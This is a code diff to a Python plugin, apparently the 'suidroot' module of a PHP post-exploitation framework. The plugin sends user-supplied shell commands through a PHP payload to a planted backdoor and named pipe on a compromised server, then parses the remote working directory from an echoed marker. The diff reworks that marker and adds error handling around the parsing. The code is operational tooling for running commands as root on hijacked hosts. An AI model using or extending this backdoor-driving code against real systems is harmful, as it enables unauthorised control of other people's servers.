@@ -117,7 +117,7 @@ for var in SUIDROOT_ENV_VARS:
 # build the command to send from given arguments
 command = 'cd ' + environ['SUIDROOT_PWD'] + '\n'  # goto exploit current dir
 command += (' '.join(plugin.argv[1:])) + '\n'  # the joined user arguments
-command += 'echo suid `pwd` suid\n'  # token to make sure new pwd is known
+command += 'echo -e "\\nsuid" `pwd` suid' # token to make sure new pwd is known
 
 # build the payload to send the command to run on system
 payload = server.payload.Payload("payload.php")
@@ -125,20 +125,25 @@ payload['BACKDOOR'] = environ['SUIDROOT_BACKDOOR']
 payload['PIPE'] = environ['SUIDROOT_PIPE']
 payload['COMMAND'] = command
 
-response = payload.send()
+output = payload.send()
 
-lines = response.splitlines()
+lines = output.splitlines()
 if not lines:
     sys.exit("")
 
 new_pwd = lines[-1]
 response = "\n".join(lines[:-1])
 
-assert new_pwd.startswith("suid ")
-assert new_pwd.endswith(" suid")
-new_pwd = new_pwd[5:-5]
-assert server.path.isabs(new_pwd)
-environ['SUIDROOT_PWD'] = new_pwd
+try:
+    assert new_pwd.startswith("suid ")
+    assert new_pwd.endswith(" suid")
+    new_pwd = new_pwd[5:-5]
+    assert server.path.isabs(new_pwd)
+    environ['SUIDROOT_PWD'] = new_pwd
+except AssertionError:
+    print("[-] Couldn't retrieve new $PWD.")
+    print("[-] Raw output:")
+    print(output)
 
 # finaly, print the command response
 print(response)
